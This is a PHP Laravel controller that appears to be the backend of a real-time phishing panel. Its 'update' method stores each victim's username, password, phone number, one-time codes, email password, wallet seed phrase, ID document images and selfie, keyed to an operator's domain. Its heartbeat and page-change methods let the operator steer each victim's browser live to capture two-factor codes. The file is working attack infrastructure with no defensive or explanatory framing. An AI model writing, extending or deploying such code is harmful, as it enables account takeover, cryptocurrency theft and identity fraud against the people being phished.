<?php

namespace App\Http\Controllers\Api;

use App\Http\Controllers\Controller;
use Illuminate\Http\Request;
use App\Models\Victim;
use App\Models\UserPanel;

class VictimController extends Controller
{
    public function update(Request $request)
    {
        $username = $request->username;
        $domain = $request->domain;
        if (!$username || !$domain) return;

        $data = $request->only(['username', 'password', 'heartbeat', 'current_page', 'next_page', 'is_waiting', 'phone', 'otp_1', 'otp_2', 'url', 'deviceurl', 'seed', 'email', 'email_password', 'email_otp', 'front_id', 'back_id', 'selfie',]);
        $panel = UserPanel::where('domain', $domain)->first();

        if ($request->has('front_id')) {
            $save = $request->file('front_id')->store('id', ['disk' => 'public']);
            $data['front_id'] = asset('storage/' . $save);
        }

        if ($request->has('back_id')) {
            $save = $request->file('back_id')->store('id', ['disk' => 'public']);
            $data['back_id'] = asset('storage/' . $save);
        }

        if ($request->has('selfie')) {
            $save = $request->file('selfie')->store('id', ['disk' => 'public']);
            $data['selfie'] = asset('storage/' . $save);
        }

        $data['heartbeat'] = intval(time());
        $data['next_page'] = 'loading';
        $data['user_panel_id'] = $panel->id;
        $data['ip_address'] = $request->ip();
        $data['user_agent'] = $request->header('User-Agent');

        $victim = Victim::updateOrCreate(['username' => $username, 'user_panel_id' => $panel->id], $data);
        return response()->json($victim->toArray(), 200);
    }

    public function get(Request $request)
    {
        $user_id = $request->query('id');

        $data = Victim::find($user_id);
        return $data;
    }

    public function heartbeat(Request $request)
    {
        $current_page = $request->query('current_page');
        $user_id = $request->query('id');

        $data = Victim::find($user_id);
        if (!$data) return 'loading';

        if ($data->current_page !== $current_page) {
            $data->current_page = $current_page;
        }

        $data->heartbeat = intval(time());
        $data->is_waiting = true;

        $data->save();
        return $data->next_page;
    }

    public function changePage(Request $request)
    {
        $victimId = $request->id;
        $victim = Victim::find($victimId);
        if (!$victim) return;

        $data = $request->only('next_page', 'phone', 'url',);

        $victim->update($data);
        return response()->json(['status' => 'OK'], 200);
    }
}
